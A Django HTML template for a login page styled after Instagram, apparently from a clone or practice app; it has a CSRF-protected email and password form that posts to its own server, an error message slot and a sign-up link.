{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Login â€¢ Instagram</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            width: 350px;
            padding: 40px;
            background: white;
            border: 1px solid #ddd;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        .form-control {
            margin-bottom: 10px;
            font-size: 14px;
        }
        .btn-login {
            width: 100%;
            background-color: #0095F6;
            border: none;
            color: white;
            padding: 8px;
            font-weight: bold;
        }
        .btn-login:hover {
            background-color: #007BDA;
        }
        .error-message {
            color: red;
            font-size: 14px;
        }
        .signup-link {
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <img src="{% static 'images/loginregister.png' %}" alt="">
    <div class="login-container">
        <img src="{% static 'images/instagram.png' %}" class="logo" alt="Instagram">
        <h1 style="font-family: 'Billabong', cursive;">Instagram</h1>
        <p class="text-muted">Sign up to see photos and videos from your friends.</p>
        
        <form method="POST">
            {% csrf_token %}
            <input type="email" name="email" class="form-control" placeholder="Email" required>
            <input type="password" name="password" class="form-control" placeholder="Password" required>
            <button type="submit" class="btn btn-login">Log In</button>
        </form>
        
        {% if error %}
            <p class="error-message">{{ error }}</p>
        {% endif %}
        
        <p class="signup-link">Don't have an account? <a href="{% url 'register' %}">Sign up</a></p>
    </div>
</body>
</html>
